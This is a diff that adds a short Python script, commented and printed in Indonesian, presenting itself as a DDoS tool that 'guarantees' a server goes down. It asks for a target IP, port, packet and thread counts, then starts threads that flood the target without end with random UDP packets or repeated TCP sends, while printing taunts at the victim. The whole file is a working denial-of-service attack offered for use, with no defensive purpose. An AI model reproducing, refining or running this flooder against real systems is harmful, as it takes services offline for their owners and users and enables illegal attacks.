@@ -1,0 +1,51 @@
+#!/usr/bin/env python3
+#Jangan ganti Nama Nya ini Buat M!Tech Anjing
+#Ddos by RdNs M!Tech
+import random
+import socket
+import threading
+import os
+
+os.system("clear")
+print("TOOLS DDOS BY: DHOO")
+print("DI JAMIN SERVER AUTO DOWN")
+ip = str(input(" IP SERVER: "))
+port = int(input(" PORT SERVER: "))
+choice = str(input(" UDAH SIAP BELUM?(y/n): "))
+times = int(input(" Packets: "))
+threads = int(input(" Threads: "))
+def run():
+  data = random._urandom(1024)
+  i = random.choice(("[DDOS!]","[DDOS!]","[DDOS!]"))
+  while True:
+    try:
+      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+      addr = (str(ip),int(port))
+      for x in range(times):
+        s.sendto(data,addr)
+      print(i +" DOWN LU ANJING, DHOO NI BOS")
+    except:
+      print("[!] M!Tech Menyerang Server")
+
+def run2():
+  data = random._urandom(16)
+  i = random.choice(("[DDOS!]","[DDOS!]","[DDOS!]"))
+  while True:
+    try:
+      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+      s.connect((ip,port))
+      s.send(data)
+      for x in range(times):
+        s.send(data)
+      print(i +" Dhoo disini bersama M!tech ")
+    except:
+      s.close()
+      print("[*] Down")
+
+for y in range(threads):
+  if choice == 'y':
+    th = threading.Thread(target = run)
+    th.start()
+  else:
+    th = threading.Thread(target = run2)
+    th.start()
